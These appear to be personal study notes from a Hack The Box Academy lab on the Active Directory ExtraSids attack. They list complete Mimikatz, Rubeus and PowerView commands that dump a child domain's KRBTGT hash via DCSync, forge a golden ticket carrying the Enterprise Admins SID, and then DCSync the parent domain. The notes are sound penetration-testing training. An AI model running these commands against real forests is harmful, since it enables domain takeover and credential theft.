## SID History Primer

- The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. 
	- If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.
- SID history is intended to work across domains, but can work in the same domain. 
	- Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. 
	- When logging in with this account, all of the SIDs associated with the account are added to the user's token. This token is used to determine what resources the account can access. 
		- If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

## ExtraSids Attack - Mimikatz

- This attack allows for the compromise of a parent domain once the child domain has been compromised. 
- Within the same AD forest, the [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) property is respected due to a lack of [SID Filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) protection.  SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust.
	- Therefore, if a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.

- In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. 
	- In this case, we will leverage the `SIDHistory` to:
		- grant an account (or non-existent account) Enterprise Admin rights by:
		- modifying this attribute to contain the SID for the Enterprise Admins group, 
			- which will give us full access to the parent domain without actually being part of the group.

- To perfrom this attacking after compromising a child domain we need:
	- The KRBTGT hash for the child domain
	- The SID for the child domain
	- The name of a target user in the child domain (doesn't need to exist)
	- The FQDN of the child domain
	- The SID of the Eneterprise Admins group of the root domain

#### Obtaining the KRBTGT Account's NT Hash using Mimikatz

-  Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.
``` mimikatz
 lsadump::dcsync /user:LOGISTICS\krbtgt
```

> The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account.


#### Using Get-DomainSID (PowerView)
``` powershell
Get-DomainSID
```

#### Obtaining Enterprise Admins Group SID

**PowerView:**
``` powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

**ActiveDirectory Built-In Module:**
``` powershell
Import-Module activedirectory

Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

#### Creating a Golden Ticket with Mimikatz
``` mimikatz
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt 
```

#### Confirming a Kerberos Ticket is in Memory Using klist
``` powershell
klist
```
![[2023-04-26 13_30_04-Hack The Box - Academy.png|600]]
- From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.
- 
#### Listing the Entire C: Drive of the Domain Controller
``` powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```


___

## ExtraSids Attack - Rubeus

- Using the same information enumerated above:
``` powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
- `/rc4` flag is the NT hash for the KRBTGT account. 
- `/sid` is the child domain SID
- `/sids` flag is the group SIDs to add
	- This wil tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.

- Use `klist` to confirm the ticket is in memory
- This can now be used to perform a DCSync attack against the parent domain

#### Performing a DCSync Attack
``` mimikatz
lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```